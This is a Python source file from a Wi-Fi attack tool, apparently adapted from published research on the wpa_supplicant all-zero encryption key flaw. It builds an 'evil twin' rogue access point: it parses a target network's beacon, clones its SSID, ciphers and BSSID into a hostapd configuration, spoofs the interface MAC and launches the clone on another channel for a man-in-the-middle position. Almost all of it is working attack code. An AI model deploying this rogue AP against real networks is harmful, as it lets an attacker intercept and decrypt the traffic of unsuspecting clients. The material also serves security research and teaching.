#!/usr/bin/env python3

# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# Modified by team KaWi, 2024
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

import os, sys
from scapy.all import *  # noqa: E402
from scapy.arch.linux import L2Socket, attach_filter
from wpaspy import Ctrl

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import struct, subprocess, time, atexit
from utils import *


class RogueAP:

    class NetworkConfig:
        def __init__(self, outer_ap):
                self.ap = outer_ap

                self.ssid = None
                self.channel = 0
                self.wpa_version = 0
                self.auth_key_mgmts = set()
                self.pairwise_ciphers = set()
                self.group_cipher = None
                self.wmm_enabled = 0
                self.rsn_capab = 0
                
        def is_wparsn(self):
            return not self.group_cipher is None and self.wpa_version > 0 and \
                len(self.pairwise_ciphers) > 0 and len(self.auth_key_mgmts) > 0
        
        # TODO: Improved parsing to handle more networks
        def parse_wparsn(self, wparsn):
            self.group_cipher = wparsn[5]

            num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
            pos = wparsn[8:]
            for i in range(num_pairwise):
                self.pairwise_ciphers.add(pos[3])
                pos = pos[4:]

            num_akm = struct.unpack("<H", pos[:2])[0]
            pos = pos[2:]
            for i in range(num_akm):
                self.auth_key_mgmts.add(pos[3])
                pos = pos[4:]

            if len(pos) >= 2:
                self.rsn_capab = struct.unpack("<H", pos[:2])[0]

        def from_beacon(self, p):
            el = p[Dot11Elt]
            while isinstance(el, Dot11Elt):
                if el.ID == IEEE_TLV_TYPE_SSID:
                    self.ssid = el.info.decode('utf-8')
                elif el.ID == IEEE_TLV_TYPE_CHANNEL:
                    self.channel = el.info[0]
                elif el.ID == IEEE_TLV_TYPE_RSN:
                    self.parse_wparsn(el.info)
                    self.wpa_version |= 2
                elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == b"\x00\x50\xf2\x01":
                    self.parse_wparsn(el.info[4:])
                    self.wpa_version |= 1
                elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == b"\x00\x50\xf2\x02":
                    self.wmm_enabled = 1

                el = el.payload
        
        def write_config(self, iface):
            TEMPLATE = """
ctrl_interface=hostapd_ctrl
ctrl_interface_group=0

interface={iface}
ssid={ssid}
hw_mode=g
channel={channel}

wpa={wpa_version}
wpa_key_mgmt={auth_key_mgmts}
wpa_pairwise={pairwise_ciphers}
rsn_pairwise={pairwise_ciphers}
rsn_ptksa_counters={ptksa_replay_counters}
rsn_gtksa_counters={gtksa_replay_counters}

wmm_enabled={wmm_enabled}
wmm_advertised={wmm_enabled}

auth_algs=3
wpa_passphrase=XXXXXXXX


# optional
nas_identifier=rogue-ap

"""
            #FIXME WPA: IE in 3/4 msg does not match with IE in Beacon/ProbeResp
            akm2str = {2: "WPA-PSK", 1: "WPA-EAP", 4: "FT-PSK", 3:"FT-EAP"}
            ciphers2str = {2: "TKIP", 4: "CCMP"}
            print("wmm_enabled:", self.wmm_enabled)
            print("ptksa_replay_counters: ", (self.rsn_capab & 0b001100) >> 2)
            print("gtksa_replay_counters: ", (self.rsn_capab & 0b001100) >> 4)

            return TEMPLATE.format(
                iface=iface,
                ssid=self.ssid,
                channel=self.channel,
                wpa_version=self.wpa_version,
                auth_key_mgmts=" ".join([akm2str[idx] for idx in self.auth_key_mgmts]),
                pairwise_ciphers=" ".join([ciphers2str[idx] for idx in self.pairwise_ciphers if idx in ciphers2str]),
                ptksa_replay_counters=(self.rsn_capab & 0b001100) >> 2,
                gtksa_replay_counters=(self.rsn_capab & 0b110000) >> 4,
                wmm_advertised=self.wmm_enabled,
                wmm_enabled=self.wmm_enabled)


    Unconfigured, Configure_Error, Interface_Error, Down, Starting, Active, Error = range(7)

    def __init__(self):
        self.mac = None
        self.status = RogueAP.Unconfigured
        self.netconfig = self.NetworkConfig(self)
        
        self.hostapd = None
        self.hostapd_log = None
        self.hostapd_ctrl = None

        self.clients = dict()
        
    def move_status(self, status):
        log(DEBUG, "RogueAP is now in status %d" % (status), showtime=False)
        self.status = status

    def config_is_valid(self):
        if not self.netconfig.channel in range(1, 14):
            log(ERROR, "Attack against 5 GHz networks are not yet supported.")
        elif not self.netconfig.is_wparsn():
            log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
        # TODO Need more validation?
        else:
            self.move_status(RogueAP.Down)
            return True
        self.move_status(RogueAP.Configure_Error)
        return False
    
    def set_config(self, *args, **kargs):
        self.netconfig = self.NetworkConfig(*args, **kargs)
        if not self.config_is_valid(): return False
        return True

    # Evil Twin for Multi-Channel Man-in-the-Middle attack
    def set_config_mc_mitm(self, beacon_p):
        # Parse beacon and used this to generate a cloned hostapd.conf
        self.netconfig.from_beacon(beacon_p)
        if not self.config_is_valid(): return False
        # Set the MAC address of the rogue hostapd AP
        self.netconfig.bssid = beacon_p.addr3
        # Select channels far away to avoid interference with the original network
        self.find_rogue_channel(self.netconfig.channel)
        return True
        
    # TODO: Check that there also isn't a real AP of this network on
    # the returned channel (possible for large networks e.g. eduroam).
    def find_rogue_channel(self, real_channel):
        real_channel = self.netconfig.channel if real_channel is None else real_channel
        log(STATUS, "Target network %s detected on channel %d" % (self.netconfig.ssid, real_channel),
            color="green")
        self.netconfig.channel = 1 if real_channel >= 6 else 11
        log(STATUS, "Will create rogueAP on channel %d" % self.netconfig.channel, color="green")


    def run(self, iface, update_conf=True, keep_watching=False):
        if not update_conf and self.status == RogueAP.Unconfigured:
            log(WARNING, "Cannot check if the network configurations are correct")
            self.move_status(RogueAP.Down)
        if not self.status == RogueAP.Down: return
        
        self.move_status(RogueAP.Starting)
        print(self.status)
        try:
            if self.netconfig.bssid is not None:
                log(STATUS, "Setting MAC address of %s to %s" % (iface, self.netconfig.bssid))
                set_mac_address(iface, self.netconfig.bssid)
        except:
            self.move_status(RogueAP.Interface_Error)

        if update_conf:
            # Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
            with open("hostapd_rogue.conf", "w") as fp:
                fp.write(self.netconfig.write_config(iface))
        self.hostapd = subprocess.Popen(["../hostap-ct/hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # FIXME: strace -p <PID> -> stdout and stderr buffer cannot be cleared(Only when directly run this module as __main__)
        # try subprocess.Popen with this options: bufsize=1, universal_newlines=True
        print("Hostapd PID:", self.hostapd.pid)
        self.hostapd_log = open("hostapd_rogue.log", "w")

        log(STATUS, "Giving the rogue hostapd one second to initialize ...")
        time.sleep(1)
        self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + iface)
        self.hostapd_ctrl.attach()
        if self.status != RogueAP.Starting:
            print(self.status)
            self.move_status(RogueAP.Configure_Error)
            return
        self.move_status(RogueAP.Active)
        if not keep_watching: return
        try:
            while self.status == RogueAP.Active:
                if update_conf:
                    log(STATUS, "RogueAP <%s[%s]> is currently ACTIVE on channel %d" % (self.netconfig.ssid, self.netconfig.bssid, self.netconfig.channel), color="green")
                else:
                    log(STATUS, "RogueAP is currently ACTIVE, configured by 'hostapd_rogue.conf'", color="green")
                time.sleep(10)
        except:
            self.move_status(RogueAP.Error)
        

    def stop(self):
        log(STATUS, "Closing hostapd and cleaning up ...")
        if self.hostapd:
            self.hostapd.terminate()
            print("Waiting...")
            self.hostapd.wait()
        if self.hostapd_log:
            self.hostapd_log.close()
        
        self.move_status(RogueAP.Down)

        

def cleanup():
    rogue_ap.stop()


if __name__ == "__main__":

    # just for test

    rogue_ap = RogueAP()

    atexit.register(cleanup)

    #rogue_ap.run('wlan1', update_conf=False, keep_watching=True)

    sample_beacon_p = RadioTap(bytes.fromhex("00000f002a000000500000000000d980000000ffffffffffff588694a0b468588694a0b46800546fc12d070f0100006400110c000a6d6f6e6f646f6f322e34010882848b961224486c03010332040c1830603308200102030405060733082105060708090a0b050400010000dd270050f204104a0001101044000102104700102880288028801880a880588694a0b468103c0001012a01042d1a6e1017ffff0000010000000000000000000000000c00000000003d16030006000000000000000000000000000000000000004a0e14000a002c01c80014000500190030140100000fac040100000fac040100000fac020000dd180050f2020101800003a4000027a4000042435e0062322f000b0502000a127add07000c43070000000000002c"))
    print(sample_beacon_p)
    rogue_ap.set_config_mc_mitm(sample_beacon_p)

    set_log_level(DEBUG)
    rogue_ap.netconfig.ssid = "TEST_NETWORK"
    rogue_ap.netconfig.bssid = "00:14:0a:43:ba:87"
    rogue_ap.run('wlan1', keep_watching=True)

    
